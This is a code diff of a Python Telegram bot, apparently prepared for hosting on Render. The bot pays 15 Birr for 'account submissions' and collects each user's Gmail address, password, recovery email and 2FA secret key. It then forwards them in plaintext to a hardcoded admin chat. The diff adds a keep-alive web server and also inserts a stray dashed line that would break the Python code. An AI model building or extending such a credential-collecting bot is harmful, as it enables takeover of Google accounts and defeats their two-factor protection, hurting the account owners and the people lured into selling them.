@@ -1,5 +1,7 @@
 import os
-from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -9,10 +11,26 @@ from telegram.ext import (
     filters,
 )
 
+# --- STEP 1: MINI WEB SERVER TO KEEP RENDER AWAKE ---
+class SimpleHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Bot is alive and running!")
+
+def run_web_server():
+    port = int(os.environ.get("PORT", 10000))
+    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
+    server.serve_forever()
+
+# Start the web server in a separate background thread
+threading.Thread(target=run_web_server, daemon=True).start()
+---------------------------------------------------
+
 # Conversation states
 EMAIL, PASSWORD, RECOVERY_EMAIL, TWO_FACTOR_KEY, TELEBIRR = range(5)
 
-# Start Command with only the Submit Account option
+# Start Command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_keyboard = [
         ["📤 Submit Account (15 Birr)"],
@@ -38,36 +56,29 @@ async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return EMAIL
 
-# Step 2: Get Email -> Ask Password
 async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
         return await cancel(update, context)
-    
     context.user_data['email'] = text
     markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
     await update.message.reply_text("🔒 Please enter your password:", reply_markup=markup)
     return PASSWORD
 
-# Step 3: Get Password -> Ask Recovery Email
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
         return await cancel(update, context)
-        
     context.user_data['password'] = text
     markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
     await update.message.reply_text("📬 Please enter your recovery email address:", reply_markup=markup)
     return RECOVERY_EMAIL
 
-# Step 4: Get Recovery Email -> Ask 2FA Key
 async def get_recovery_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
         return await cancel(update, context)
-        
     context.user_data['recovery_email'] = text
-    
     reply_keyboard = [
         ["🔑 Add 2FA key", "⏩ Skip 2FA"],
         ["❌ Cancel"]
@@ -79,12 +90,10 @@ async def get_recovery_email(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
     return TWO_FACTOR_KEY
 
-# Step 5: Handle 2FA choice
 async def handle_2fa_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
         return await cancel(update, context)
-        
     if text == "🔑 Add 2FA key":
         markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
         await update.message.reply_text("⌨️ Please type your 2FA secret key:", reply_markup=markup)
@@ -95,18 +104,15 @@ async def handle_2fa_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("💰 Please enter your Telebirr account name/number for payout:", reply_markup=markup)
         return TELEBIRR
 
-# Step 6: Get 2FA key if typed manually
 async def get_2fa_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
         return await cancel(update, context)
-        
     context.user_data['2fa'] = text
     markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
     await update.message.reply_text("💰 Please enter your Telebirr account name/number for payout:", reply_markup=markup)
     return TELEBIRR
 
-# Final Step: Get Telebirr, Send to Admin, Finish
 async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     if text == "❌ Cancel":
@@ -119,17 +125,13 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     two_fa = context.user_data.get('2fa', 'N/A')
     
     user = update.effective_user
-    user_id = user.id
-    username = user.username if user.username else "No username"
-    first_name = user.first_name
-    
     my_admin_id = 2103337926  # Your Admin ID
     
     admin_message = (
         f"🚨 **NEW ACCOUNT SUBMISSION** 🚨\n\n"
-        f"👤 **User Name:** {first_name}\n"
-        f"🆔 **User ID:** `{user_id}`\n"
-        f"🔗 **Username:** @{username}\n\n"
+        f"👤 **User Name:** {user.first_name}\n"
+        f"🆔 **User ID:** `{user.id}`\n"
+        f"🔗 **Username:** @{user.username if user.username else 'None'}\n\n"
         f"📧 **Gmail:** {email}\n"
         f"🔑 **Password:** {password}\n"
         f"📬 **Recovery:** {recovery}\n"
@@ -145,7 +147,6 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ["💬 Help", "🤖 My Bot"]
     ]
     markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
-    
     await update.message.reply_text(
         "✅ Submission received successfully! Pending verification for your **15 Birr** payout.",
         parse_mode="Markdown",
@@ -153,7 +154,6 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return ConversationHandler.END
 
-# Support Handlers
 async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("💬 **Help & Support:**\nContact the admin if you experience any issues receiving your 15 Birr payout.")
 
@@ -176,41 +176,26 @@ if __name__ == '__main__':
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     conv_handler = ConversationHandler(
-        entry_points=[
-            MessageHandler(filters.Regex("^📤 Submit Account \(15 Birr\)$"), submit_start)
-        ],
+        entry_points=[MessageHandler(filters.Regex("^📤 Submit Account \(15 Birr\)$"), submit_start)],
         states={
-            EMAIL: [
-                MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)
-            ],
-            PASSWORD: [
-                MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)
-            ],
-            RECOVERY_EMAIL: [
-                MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recovery_email)
-            ],
+            EMAIL: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
+            PASSWORD: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+            RECOVERY_EMAIL: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_recovery_email)],
             TWO_FACTOR_KEY: [
                 MessageHandler(filters.Regex("^🔑 Add 2FA key$"), handle_2fa_choice),
                 MessageHandler(filters.Regex("^⏩ Skip 2FA$"), handle_2fa_choice),
                 MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_key)
             ],
-            TELEBIRR: [
-                MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr)
-            ],
+            TELEBIRR: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(conv_handler)
-    
     app.add_handler(MessageHandler(filters.Regex("^💬 Help$"), help_handler))
     app.add_handler(MessageHandler(filters.Regex("^🤖 My Bot$"), my_bot_handler))
 
-    print("Bot is running with simplified submit flow...")
+    print("Bot and web server are running...")
     app.run_polling()
